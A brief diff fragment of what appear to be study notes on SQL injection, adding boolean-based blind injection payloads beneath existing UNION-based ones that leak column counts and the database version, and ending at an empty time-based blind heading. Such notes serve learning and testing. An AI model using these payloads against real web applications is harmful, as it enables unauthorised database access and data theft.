@@ -12,3 +12,8 @@ id=1' UNION SELECT 1,2# -> shows output of 2 columns (confirms union sqli works)
 id=1' UNION SELECT @@version,2# -> db version leaked 
 
 3. Blind SQLi (Boolean-Based)
+id=1' AND 1=1# -> data returned
+id=1' AND 1=2# -> no error but no data returned as well 
+
+4. Time-Based Blind SQLi
+
